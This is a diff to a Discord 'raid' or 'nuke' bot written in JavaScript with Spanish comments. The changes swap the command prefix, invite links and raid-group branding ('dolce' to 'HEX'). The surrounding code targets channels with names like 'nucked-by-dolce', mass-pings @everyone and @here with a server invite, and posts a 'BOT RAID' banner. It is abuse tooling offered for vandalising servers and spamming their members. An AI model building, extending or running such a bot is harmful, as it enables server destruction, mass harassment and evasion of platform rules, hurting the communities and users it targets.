@@ -2,7 +2,7 @@ const { Client, Events, ComponentType, ReactionEmoji, GuildEmoji, WebhookClient,
 const client = new Client({intents: [103423]});
 const fetch = require('node-fetch');
 const bot_token = ""; // Introducir el token del bot
-const prefix = "."; // Prefijo del bot
+const prefix = "$"; // Prefijo del bot
 const names_channels = ["f̷v̷c̷k̷e̷d̷-̷b̷y̷-̷d̷o̷l̷c̷e̷", "g̷u̷i̷l̷d̷-̷c̷r̷y̷", "n̷u̷c̷k̷e̷d̷-̷b̷y̷-̷d̷o̷l̷c̷e̷", "d̷o̷l̷c̷e̷-̷k̷i̷n̷g̷"];
 const userid_vip = ["tu ID de Discord xdxd", "1189795248826744958"];
 async function wait_ms(ms) {return new Promise(resolve => setTimeout(resolve, ms));};
@@ -19,17 +19,17 @@ client.on(`ready`,()=>{
 client.on(`channelCreate`,async (channel)=>{
     if(names_channels.includes(channel.name)){
         try {
-            await channel.send({content:`@everyone | @here\nhttps://discord.gg/kEB3PCPkzc`}).then(async (mensajexd)=>{await channel.messages.cache.get(mensajexd.id).delete();}).catch((e)=>{console.log(e)})
+            await channel.send({content:`@everyone | @here\nhttps://discord.gg/E8hQrUNNH8`}).then(async (mensajexd)=>{await channel.messages.cache.get(mensajexd.id).delete();}).catch((e)=>{console.log(e)})
             await channel.send({embeds:[
                         new EmbedBuilder()
                         .setImage(`https://i.ibb.co/8dSDY89/562331249efe5719fe258976514560fe-1.gif`)
                         .setTitle(`**-                           /dolce GVNG                           -
      
-                      -        TOP BOT RAID        -
+                      -         BOT RAID        -
      
-              - https://www.discord.gg/dolce -
+              - https://www.discord.gg/hex -
      
-     -          OWNERS: /DOLCE      -**`)
+     -          OWNERS: /HEX      -**`)
             ]}).catch((e)=>{console.log(e)})
             mensajes_enviados++;
         } catch (e) {
